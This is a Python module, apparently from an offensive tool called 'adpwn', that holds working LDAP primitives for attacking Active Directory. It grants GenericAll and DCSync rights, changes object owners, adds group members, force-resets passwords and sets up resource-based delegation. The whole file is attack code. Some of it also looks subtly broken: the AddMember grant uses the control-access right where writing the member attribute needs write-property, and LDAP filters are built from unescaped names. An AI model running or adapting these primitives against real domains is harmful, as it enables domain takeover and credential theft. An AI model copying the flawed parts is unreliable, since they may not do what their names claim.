"""
adpwn.primitives – Raw LDAP ACL manipulation over ldap3.

All functions that modify objects return a dict:
    {
        "success": bool,
        "target_dn": str,
        "original_sd": str,   # hex of the original nTSecurityDescriptor (SD ops)
        "original_rbcd": str, # hex of original msDS-AllowedToActOnBehalfOf... (RBCD)
        "raw_output": str,
    }

Functions that only read/delete return a bool or a simple dict.
"""
from __future__ import annotations

import struct
import ldap3
from ldap3 import MODIFY_REPLACE, MODIFY_ADD, MODIFY_DELETE, BASE, SUBTREE


class PrimitiveError(Exception):
    """Raised when an LDAP primitive operation fails."""


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# LDAP control OID for nTSecurityDescriptor access
_SD_OID = "1.2.840.113556.1.4.801"

# Security Descriptor control flags (bitmask for the BER control value)
_SD_OWNER = 0x01
_SD_GROUP = 0x02
_SD_DACL  = 0x04
_SD_ALL   = _SD_OWNER | _SD_GROUP | _SD_DACL

# ACE types
_ACE_ALLOW        = 0x00  # ACCESS_ALLOWED_ACE_TYPE
_ACE_ALLOW_OBJECT = 0x05  # ACCESS_ALLOWED_OBJECT_ACE_TYPE

# ACL revision: must be 4 (DS) when object ACEs are present
_ACL_REV    = 2
_ACL_REV_DS = 4

# Access masks
_GENERIC_ALL    = 0x000F01FF   # Full control
_EXTENDED_RIGHT = 0x00000100   # ADS_RIGHT_DS_CONTROL_ACCESS (for object ACEs)

# DCSync right GUIDs (Windows mixed-endian binary)
# GetChanges     {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
GUID_GET_CHANGES     = bytes.fromhex("aaf63111079cd111f79f00c04fc2dcd2")
# GetChangesAll  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}
GUID_GET_CHANGES_ALL = bytes.fromhex("adf63111079cd111f79f00c04fc2dcd2")
# AddMember WriteProperty on the member attribute
# {bf9679c0-0de6-11d0-a285-00aa003049e2}
GUID_ADD_MEMBER      = bytes.fromhex("c07996bfe60dd011a28500aa003049e2")


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _sd_ctrl_value(flags: int) -> bytes:
    """BER-encode the SD retrieval flags: SEQUENCE { INTEGER flags }."""
    return b"\x30\x03\x02\x01" + bytes([flags])


def _read_sd(conn: ldap3.Connection, dn: str, flags: int = _SD_ALL) -> bytes:
    """Read the nTSecurityDescriptor from *dn*. Returns raw bytes."""
    ctrl = (_SD_OID, True, _sd_ctrl_value(flags))
    ok = conn.search(dn, "(objectClass=*)", BASE,
                     attributes=["nTSecurityDescriptor"], controls=[ctrl])
    if not ok or not conn.entries:
        raise PrimitiveError(f"Cannot read SD for {dn}: {conn.result}")
    raw = conn.entries[0]["nTSecurityDescriptor"].raw_values
    if not raw:
        raise PrimitiveError(f"No nTSecurityDescriptor on {dn}")
    return raw[0]


def _write_sd(conn: ldap3.Connection, dn: str, sd_bytes: bytes,
              flags: int = _SD_DACL) -> None:
    """Write *sd_bytes* as the nTSecurityDescriptor of *dn*."""
    ctrl = (_SD_OID, True, _sd_ctrl_value(flags))
    conn.modify(dn, {"nTSecurityDescriptor": [(MODIFY_REPLACE, [sd_bytes])]},
                controls=[ctrl])
    rc = conn.result.get("result", -1)
    if rc != 0:
        desc = conn.result.get("description", "unknown")
        raise PrimitiveError(f"Write SD failed for {dn}: {desc} (rc={rc})")


def _dacl_offset(sd_bytes: bytes) -> int:
    """Return the byte offset of the DACL inside *sd_bytes*, or 0 if absent."""
    _, _, _, _, _, _, off_dacl = struct.unpack_from("<BBHIIII", sd_bytes, 0)
    return off_dacl


def _add_ace_to_sd(sd_bytes: bytes, new_ace: bytes, is_object_ace: bool = False) -> bytes:
    """
    Return new SD bytes with *new_ace* prepended to the existing DACL.
    Creates a minimal DACL if none is present.
    """
    off_dacl = _dacl_offset(sd_bytes)

    if off_dacl == 0:
        # No DACL yet – build a fresh one
        dacl = _build_dacl([new_ace], is_object_ace)
        new_off_dacl = len(sd_bytes)
        new_sd = bytearray(sd_bytes) + bytearray(dacl)
        rev, sbz1, ctrl, off_o, off_g, off_s, _ = struct.unpack_from("<BBHIIII", new_sd, 0)
        ctrl_new = ctrl | 0x0004 | 0x8000  # SE_DACL_PRESENT | SE_SELF_RELATIVE
        struct.pack_into("<H", new_sd, 2, ctrl_new)
        struct.pack_into("<I", new_sd, 16, new_off_dacl)
        return bytes(new_sd)

    # Parse existing DACL header (8 bytes)
    dacl_bytes = sd_bytes[off_dacl:]
    rev, sbz1, size, count, sbz2 = struct.unpack_from("<BBHHH", dacl_bytes, 0)

    new_rev   = _ACL_REV_DS if is_object_ace else max(rev, _ACL_REV)
    new_size  = size + len(new_ace)
    new_count = count + 1
    new_dacl_header = struct.pack("<BBHHH", new_rev, sbz1, new_size, new_count, sbz2)
    existing_aces   = dacl_bytes[8:]
    new_dacl        = new_dacl_header + new_ace + existing_aces

    new_sd = bytearray(sd_bytes[:off_dacl]) + bytearray(new_dacl)
    rev, sbz1, ctrl, off_o, off_g, off_s, _ = struct.unpack_from("<BBHIIII", new_sd, 0)
    ctrl_new = ctrl | 0x0004 | 0x8000
    struct.pack_into("<H", new_sd, 2, ctrl_new)
    struct.pack_into("<I", new_sd, 16, off_dacl)
    return bytes(new_sd)


def _build_dacl(aces: list, is_object_ace: bool = False) -> bytes:
    """Build a DACL from a list of ACE byte strings."""
    body = b"".join(aces)
    size = 8 + len(body)
    rev  = _ACL_REV_DS if is_object_ace else _ACL_REV
    return struct.pack("<BBHHH", rev, 0, size, len(aces), 0) + body


def _make_allowed_ace(mask: int, sid: bytes, ace_flags: int = 0) -> bytes:
    """Build an ACCESS_ALLOWED_ACE."""
    size = 4 + 4 + len(sid)
    return struct.pack("<BBHI", _ACE_ALLOW, ace_flags, size, mask) + sid


def _make_object_ace(mask: int, object_guid: bytes, sid: bytes,
                     ace_flags: int = 0) -> bytes:
    """Build an ACCESS_ALLOWED_OBJECT_ACE with ObjectType set."""
    # Flags = 0x01 means ACE_OBJECT_TYPE_PRESENT
    size = 4 + 4 + 4 + 16 + len(sid)
    header  = struct.pack("<BBHI", _ACE_ALLOW_OBJECT, ace_flags, size, mask)
    obj_flg = struct.pack("<I", 0x01)
    return header + obj_flg + object_guid + sid


def _sid_size(sid: bytes) -> int:
    """Return the byte length of a binary SID."""
    if len(sid) < 2:
        raise PrimitiveError("SID too short")
    return 8 + 4 * sid[1]


def _get_default_nc(conn: ldap3.Connection) -> str:
    """Return the defaultNamingContext (domain root DN)."""
    conn.search("", "(objectClass=*)", BASE, attributes=["defaultNamingContext"])
    if conn.entries:
        return str(conn.entries[0]["defaultNamingContext"])
    raise PrimitiveError("Cannot determine defaultNamingContext from rootDSE")


# ---------------------------------------------------------------------------
# Public primitives
# ---------------------------------------------------------------------------

def resolve_principal(conn: ldap3.Connection, name: str):
    """
    Resolve a name, sAMAccountName or DN to (distinguished_name, sid_bytes).
    """
    base_dn = _get_default_nc(conn)

    if "=" in name:
        # Looks like a DN – search directly
        conn.search(name, "(objectClass=*)", BASE, attributes=["objectSid"])
        if not conn.entries:
            raise PrimitiveError(f"Object not found by DN: {name}")
        sid = conn.entries[0]["objectSid"].raw_values[0]
        return name, sid

    # sAMAccountName or UPN
    if "@" in name:
        sam = name.split("@")[0]
        ldap_filter = f"(|(sAMAccountName={sam})(userPrincipalName={name}))"
    else:
        ldap_filter = f"(sAMAccountName={name})"

    conn.search(base_dn, ldap_filter, SUBTREE,
                attributes=["objectSid", "distinguishedName"])
    if not conn.entries:
        raise PrimitiveError(f"Principal not found: {name!r}")
    entry = conn.entries[0]
    dn  = str(entry["distinguishedName"])
    sid = entry["objectSid"].raw_values[0]
    return dn, sid


def grant_full_control(conn: ldap3.Connection, target_dn: str,
                       trustee_sid: bytes) -> dict:
    """
    Grant GenericAll on *target_dn* to the principal identified by *trustee_sid*.
    Preserves the original SD for later restore.
    """
    original_sd = _read_sd(conn, target_dn)
    ace         = _make_allowed_ace(_GENERIC_ALL, trustee_sid)
    new_sd      = _add_ace_to_sd(original_sd, ace, is_object_ace=False)
    _write_sd(conn, target_dn, new_sd)
    return {
        "success":     True,
        "target_dn":   target_dn,
        "original_sd": original_sd.hex(),
        "raw_output":  f"GenericAll ACE written to {target_dn}",
    }


def grant_dcsync(conn: ldap3.Connection, trustee_sid: bytes) -> dict:
    """
    Grant DCSync rights (GetChanges + GetChangesAll) on the domain root.
    """
    domain_root = _get_default_nc(conn)
    original_sd = _read_sd(conn, domain_root)

    ace_gc  = _make_object_ace(_EXTENDED_RIGHT, GUID_GET_CHANGES,     trustee_sid)
    ace_gca = _make_object_ace(_EXTENDED_RIGHT, GUID_GET_CHANGES_ALL, trustee_sid)

    new_sd = _add_ace_to_sd(original_sd, ace_gc,  is_object_ace=True)
    new_sd = _add_ace_to_sd(new_sd,      ace_gca, is_object_ace=True)
    _write_sd(conn, domain_root, new_sd)

    return {
        "success":     True,
        "target_dn":   domain_root,
        "original_sd": original_sd.hex(),
        "raw_output":  f"DCSync ACEs (GetChanges + GetChangesAll) written to {domain_root}",
    }


def add_group_member(conn: ldap3.Connection, group_dn: str,
                     member_dn: str) -> dict:
    """Add *member_dn* to the group at *group_dn*."""
    conn.modify(group_dn, {"member": [(MODIFY_ADD, [member_dn])]})
    rc   = conn.result.get("result", -1)
    desc = conn.result.get("description", "")
    if rc != 0:
        raise PrimitiveError(f"add_group_member failed (rc={rc}): {desc}")
    return {
        "success":   True,
        "group_dn":  group_dn,
        "member_dn": member_dn,
        "raw_output": f"Added {member_dn} to {group_dn}",
    }


def remove_group_member(conn: ldap3.Connection, group_dn: str,
                        member_dn: str) -> bool:
    """Remove *member_dn* from the group at *group_dn*. Returns True on success."""
    conn.modify(group_dn, {"member": [(MODIFY_DELETE, [member_dn])]})
    rc = conn.result.get("result", -1)
    if rc == 53:
        raise PrimitiveError(
            f"remove_group_member refused (rc=53 unwillingToPerform) – "
            f"group may be adminSDHolder-protected: {group_dn}"
        )
    if rc != 0:
        raise PrimitiveError(
            f"remove_group_member failed (rc={rc}): {conn.result.get('description', '')}"
        )
    return True


def write_owner(conn: ldap3.Connection, target_dn: str,
                owner_sid: bytes) -> dict:
    """
    Change the Owner field of *target_dn*'s security descriptor.
    Requires WriteOwner right on the target.
    """
    original_sd = _read_sd(conn, target_dn, flags=_SD_ALL)

    # Parse SD header
    rev, sbz1, ctrl, off_owner, off_group, off_sacl, off_dacl = struct.unpack_from(
        "<BBHIIII", original_sd, 0)

    # Determine old owner size
    if off_owner:
        old_owner_size = _sid_size(original_sd[off_owner:])
    else:
        old_owner_size = 0
    new_owner_size = len(owner_sid)
    delta = new_owner_size - old_owner_size

    # New owner goes at offset 20 (right after the 20-byte fixed header)
    new_off_owner = 20
    # Adjust offsets for sections that come after the owner
    def _adj(off):
        return (off + delta) if off and off > (off_owner or 0) else off

    new_off_group = _adj(off_group)
    new_off_sacl  = _adj(off_sacl)
    new_off_dacl  = _adj(off_dacl)

    ctrl_new = ctrl | 0x8000  # SE_SELF_RELATIVE
    new_header = struct.pack("<BBHIIII",
                             rev, sbz1, ctrl_new,
                             new_off_owner, new_off_group,
                             new_off_sacl, new_off_dacl)

    content_after_owner = original_sd[(off_owner + old_owner_size) if off_owner else 20:]
    new_sd = new_header + owner_sid + content_after_owner

    _write_sd(conn, target_dn, new_sd, flags=_SD_OWNER)
    return {
        "success":     True,
        "target_dn":   target_dn,
        "original_sd": original_sd.hex(),
        "raw_output":  f"Owner changed on {target_dn}",
    }


def reset_password(conn: ldap3.Connection, target_dn: str,
                   new_password: str) -> dict:
    """
    Force-reset a user's password (requires ForceChangePassword right).
    NOTE: The original password is NOT recoverable.
    """
    # Encode as UTF-16LE surrounded by double-quotes (Windows requirement)
    encoded = f'"{new_password}"'.encode("utf-16-le")
    conn.modify(target_dn, {"unicodePwd": [(MODIFY_REPLACE, [encoded])]})
    rc   = conn.result.get("result", -1)
    desc = conn.result.get("description", "")
    if rc != 0:
        raise PrimitiveError(f"reset_password failed (rc={rc}): {desc}")
    return {
        "success":    True,
        "target_dn":  target_dn,
        "raw_output": f"Password reset on {target_dn}",
    }


def add_rbcd(conn: ldap3.Connection, target_dn: str,
             trustee_sid: bytes) -> dict:
    """
    Configure Resource-Based Constrained Delegation on *target_dn* for *trustee_sid*.

    Reads the existing msDS-AllowedToActOnBehalfOfOtherIdentity, adds an
    ACCESS_ALLOWED_ACE for *trustee_sid*, and writes it back.
    """
    attr = "msDS-AllowedToActOnBehalfOfOtherIdentity"

    # Read existing value
    conn.search(target_dn, "(objectClass=*)", BASE, attributes=[attr])
    if not conn.entries:
        raise PrimitiveError(f"Object not found: {target_dn}")
    raw_rbcd = conn.entries[0][attr].raw_values
    original_rbcd = raw_rbcd[0].hex() if raw_rbcd else ""

    if raw_rbcd:
        # Append our ACE to the existing SD
        ace    = _make_allowed_ace(_GENERIC_ALL, trustee_sid)
        new_sd = _add_ace_to_sd(raw_rbcd[0], ace)
    else:
        # Build a fresh minimal SD
        ace    = _make_allowed_ace(_GENERIC_ALL, trustee_sid)
        dacl   = _build_dacl([ace])
        # Header: Revision=1, Sbz1=0, Control=SE_DACL_PRESENT|SE_SELF_RELATIVE=0x8004
        # OffOwner=0, OffGroup=0, OffSacl=0, OffDacl=20
        header = struct.pack("<BBHIIII", 1, 0, 0x8004, 0, 0, 0, 20)
        new_sd = header + dacl

    conn.modify(target_dn, {attr: [(MODIFY_REPLACE, [new_sd])]})
    rc   = conn.result.get("result", -1)
    desc = conn.result.get("description", "")
    if rc != 0:
        raise PrimitiveError(f"add_rbcd failed (rc={rc}): {desc}")

    return {
        "success":       True,
        "target_dn":     target_dn,
        "original_rbcd": original_rbcd,
        "raw_output":    f"RBCD configured on {target_dn}",
    }


def grant_addmember_privilege(conn: ldap3.Connection, group_dn: str,
                              trustee_sid: bytes) -> dict:
    """
    Grant WriteProperty (AddMember) right on *group_dn* to *trustee_sid*.
    Uses an object ACE targeting the member attribute GUID.
    """
    original_sd = _read_sd(conn, group_dn)
    ace    = _make_object_ace(_EXTENDED_RIGHT, GUID_ADD_MEMBER, trustee_sid)
    new_sd = _add_ace_to_sd(original_sd, ace, is_object_ace=True)
    _write_sd(conn, group_dn, new_sd)
    return {
        "success":     True,
        "target_dn":   group_dn,
        "original_sd": original_sd.hex(),
        "raw_output":  f"AddMember ACE written to {group_dn}",
    }
